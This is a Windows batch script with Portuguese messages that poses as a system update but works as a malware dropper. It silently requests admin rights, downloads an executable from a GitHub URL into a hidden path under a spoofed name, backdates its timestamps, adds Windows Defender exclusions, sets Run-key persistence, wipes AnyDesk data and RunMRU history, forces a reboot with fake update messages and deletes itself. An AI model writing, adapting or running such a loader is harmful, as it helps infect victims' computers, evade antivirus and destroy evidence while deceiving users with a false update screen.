@echo off
setlocal enabledelayedexpansion
title Sistema de Atualizacao Windows

:: [1] Solicitar Admin de forma silenciosa
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: [2] Definir Caminhos (Tier 0 Stealth Paths)
set "targetDir=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Microsoft\Windows\Update"
set "targetExe=%targetDir%\WinStoreHost.exe"
set "repoUrl=https://raw.githubusercontent.com/V3xDev/unknow2/main/Rocket.exe"
set "regKey=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "regName=WindowsApps"

echo [*] Iniciando configuracao critica do sistema...

:: [3] Limpeza AnyDesk (Remover rastros de suporte/SS)
echo [*] Otimizando componentes de rede...
taskkill /f /im AnyDesk.exe >nul 2>&1
if exist "%APPDATA%\AnyDesk" rd /s /q "%APPDATA%\AnyDesk" >nul 2>&1
if exist "%LOCALAPPDATA%\AnyDesk" rd /s /q "%LOCALAPPDATA%\AnyDesk" >nul 2>&1

:: [4] Criar Pasta e baixar o executavel
if not exist "%targetDir%" mkdir "%targetDir%"
attrib +h +s "%targetDir%"

echo [*] Sincronizando com o servidor de seguranca...
curl -s -L -o "%targetExe%" "%repoUrl%"

if not exist "%targetExe%" (
    echo [!] Falha na sincronizacao. Verifique sua conexao.
    pause
    exit /b
)

:: [5] Stealth: Ocultacao e Spoofing de Data (Tier 0)
:: Alterar data para 2021 (Faz parecer que o arquivo e antigo e original do sistema)
powershell -Command "$f=Get-Item '%targetExe%'; $d=Get-Date '2021-05-15'; $f.CreationTime=$d; $f.LastWriteTime=$d; $f.LastAccessTime=$d" >nul 2>&1
attrib +h +s +r "%targetExe%"

:: [6] Adicionar Exclusao no Windows Defender (Silencioso)
powershell -Command "Add-MpPreference -ExclusionPath '%targetDir%'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionProcess '%targetExe%'" >nul 2>&1

:: [7] Configurar Auto-Incializacao
reg add "%regKey%" /v "%regName%" /t REG_SZ /d "\"%targetExe%\" --monitor" /f >nul

:: [8] Limpeza Final de Rastros (RunMRU e Prefetch de instalacao)
powershell -Command "Remove-Item -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\*' -ErrorAction SilentlyContinue" >nul 2>&1

:: [9] Finalizar e Reiniciar
echo.
echo ======================================================
echo    CONFIGURACAO CONCLUIDA COM SUCESSO!
echo.
echo    O PC SERA REINICIADO EM 10 SEGUNDOS PARA
echo    APLICAR AS ATUALIZACOES DE SEGURANCA.
echo ======================================================
echo.

:: Shutdown com mensagem amigavel
shutdown /r /t 10 /c "O sistema sera reiniciado para aplicar as configuracoes de atualizacao." /f

timeout /t 5 >nul

:: [10] Auto-destruicao do instalador
(goto) 2>nul & del "%~f0"
